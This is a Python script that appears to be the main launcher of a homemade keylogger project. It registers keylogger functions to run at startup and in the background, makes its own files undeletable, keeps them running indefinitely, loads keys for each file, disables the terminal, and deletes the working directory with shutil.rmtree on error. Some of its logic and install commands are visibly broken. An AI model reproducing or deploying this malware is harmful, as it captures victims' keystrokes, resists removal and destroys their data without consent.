import keylogger
import background_runner
import test
import test1
import test2
import CodeTest
import mycmd
import powershell
import terminal
import make_terminal_unusable
import os
import shutil
import platform

CURRENT_OS = platform.system()

try:
    import pynput
    import cryptography

except Exception:
    if CURRENT_OS == 'Windows':
        windows = terminal.start_cmd()
        windows.write("winget install pynput, cryptography")

    elif CURRENT_OS == 'Darwin' or 'Linux':
        OS = terminal.start_terminal()
        OS.write("sudo install pynput, cryptography")
    
    else:
        make_terminal_unusable.terminalDestroyer()


CURRENT_DIR = os.getcwd()

try:
    mycmd.starter_cmd()
    powershell.start_powershell()
    terminal.start_terminal()
    

    background_runner.run_on_startup(CodeTest.codeTest)
    background_runner.run_in_background(CodeTest.codeTest)
    background_runner.run_on_startup(keylogger.on_press)
    background_runner.run_on_startup(keylogger.start_Keylogger)
    background_runner.run_in_background(keylogger.on_press)
    background_runner.run_in_background(keylogger.start_keylogger)

    test1.make_file_undeletable("logs.txt")
    test1.make_file_undeletable("background_runner.py")
    test1.make_file_undeletable("keylogger.py")
    test1.make_file_undeletable("test.py")
    test1.make_file_undeletable("test1.py")
    test1.make_file_undeletable("test2.py")
    test1.make_file_undeletable("CodeTest.py")
    test1.make_file_undeletable("make_terminal_unusable.py")

    test.run_forever("background_runner.py")
    test.run_forever("keylogger.py")
    test.run_forever("test.py")
    test.run_forever("test1.py")
    test.run_forever("test2.py")
    test.run_forever("CodeTest.py")
    test.run_forever("make_terminal_unusable.py")

    test2.load_key("background_runner.py")
    test2.load_key("keylogger.py")
    test2.load_key("test.py")
    test2.load_key("test1.py")
    test2.load_key("CodeTest.py")
    test2.load_key("make_terminal_unusable.py")

    make_terminal_unusable.terminalDestroyer()


except Exception:
    try:
        make_terminal_unusable.terminalDestroyer()

    except Exception as e:
        print(f"An error {e} occured while trying to start the opration")
        pass

    shutil.rmtree(CURRENT_DIR)